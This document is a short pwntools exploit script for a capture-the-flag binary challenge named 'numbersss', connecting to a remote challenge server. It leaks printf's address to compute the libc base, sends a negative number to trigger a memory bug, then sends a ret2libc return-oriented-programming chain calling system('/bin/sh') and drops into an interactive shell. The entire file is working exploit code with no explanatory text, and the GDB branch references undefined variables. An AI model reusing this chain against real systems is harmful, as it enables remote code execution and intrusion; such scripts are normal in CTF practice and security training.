from pwn import *
# fill in binary name
elf = context.binary = ELF("./numbersss")
# fill in libc name
libc = ELF("./libc.so.6")

if args.REMOTE:
  # fill in remote address
  p = remote("numbersss.chal.cyberjousting.com", 1351)
elif args.REMOTE2:
  p = remote("localhost", 40003)
elif args.GDB:
  context.terminal = ["tmux", "splitw", "-h"]
  p = gdb.debug(binary, gdbscript=gs)
else:
  p = elf.process(env = {"LD_PRELOAD": libc.path})

p.recvuntil(b'0x')
printf = int(p.recvuntil(b'\n')[:-1].decode(), 16)
p.recvline()
print("printf: ", hex(printf))
libc_base = printf - libc.sym["printf"]
print("libc: ", hex(libc_base))

p.sendline(b'-10')

payload = b'a' * 24

payload += p64(libc_base + 0x23159) # ret for stack alignment
payload += p64(libc_base + 0x00000000000240e5) # pop rdi; ret
x = next(libc.search(b"/bin/sh"))
print(x)
payload += p64(libc_base + x)
payload += p64(libc_base + libc.sym["system"])
payload += b'B'*190 + b'cat flag.txt'

pause()
p.sendline(payload)
p.interactive()
